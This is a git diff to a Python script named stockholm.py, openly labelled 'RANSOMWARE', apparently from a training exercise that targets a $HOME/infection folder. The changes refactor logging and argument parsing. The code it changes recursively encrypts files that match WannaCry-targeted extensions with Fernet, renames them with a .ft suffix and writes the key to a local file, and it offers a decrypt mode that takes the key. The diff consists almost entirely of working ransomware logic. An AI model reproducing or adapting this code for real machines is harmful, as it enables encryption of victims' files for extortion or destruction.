@@ -15,9 +15,8 @@ def encryptFolder(path,key):
     if not os.access(path, os.R_OK | os.W_OK):
         log(f'\33[31mAccess denied to {path}\33[0m')
         return
-    # find all files, which endswith wannacry exts
     file_list = os.listdir(path)
-    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f))] # and f.endswith(wannacry)
+    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f)) and f.endswith(wannacry)]
     dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
     log(f"\33[35mFiles to encrypt : {files_only}\33[0m")
     try:
@@ -33,7 +32,7 @@ def encryptFolder(path,key):
                     log(f"\33[94mRenaming file to : {file + '.ft'}\33[0m")
                     os.rename(file,file + '.ft')
     except Exception as e:
-        print('errioooror')
+        log(f"Error: {e}")
     for folder in dirs_only:
         encryptFolder(folder,key)
 
@@ -59,27 +58,28 @@ def decryptFolder(path,key):
                 decryptedData = fer.decrypt(content)
             except (InvalidToken,TypeError) :
                 log('\33[31mError : Invalid Key.\33[0m')
-                exit(1)
+                continue
             with open(file, 'bw') as f:
                 f.write(decryptedData)
                 log(f"\33[94mRenaming file to : {file[:-3]}\33[0m")
                 os.rename(file,file[:-3])
     except Exception as e:
-        print(e)
+        log(f"Error: {e}")
     for folder in dirs_only:
         decryptFolder(folder,key)
 
-if __name__ == '__main__':
+def get_args():
     usage = 'usage: stockholm.py [-h] [-v | -r key] [-s]'
     parser = argparse.ArgumentParser(description='RANSOMWARE')
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-v',action='store_true',help='Display the version of the program and exit')
     group.add_argument('-r','-reverse',type=str,help='Reverse the infection using the key provided as argument',metavar='key',default=None)
     parser.add_argument('-s','-silent',action='store_true',help='silence the program, no output')
-    args = parser.parse_args()
-    # if args.v == False and args.r == None and args.s == False:
-    #     print(usage)
-    #     exit(1)
+    return parser.parse_args()
+
+
+if __name__ == '__main__':
+    args = get_args()
     silent = args.s
     if args.v:
         log(f"version : {version}")
@@ -88,7 +88,7 @@ if __name__ == '__main__':
     if (home == None):
         log('$HOME not set.')
         exit(1)
-    folder = home + '/infection'
+    folder = os.path.join(home,'infection')
     log(f'\33[91mTARGET : {folder}\33[0m')
     if not os.path.exists(folder):
         log(f'File {folder} does not exist.')
@@ -96,13 +96,15 @@ if __name__ == '__main__':
     if args.r == None:
         try:
             key = Fernet.generate_key()
+            log("Generating encryption Key ...")
             with open('ransom_key', 'w') as f:
                 f.write(f"{key.decode()}")
+            log("Key saved in 'ransom_key', \33[91m(IF YOU LOSE THE KEY, YOU WON'T BE ABLE TO DECRYPT YOUR FILES)\33[0m")
             encryptFolder(folder,key)
         except Exception as e:
-            print(e)
+            log(f"Error: {e}")
     else:
         try:
             decryptFolder(folder,args.r)
         except Exception as e:
-            print(e)
+            log(f"Error: {e}")
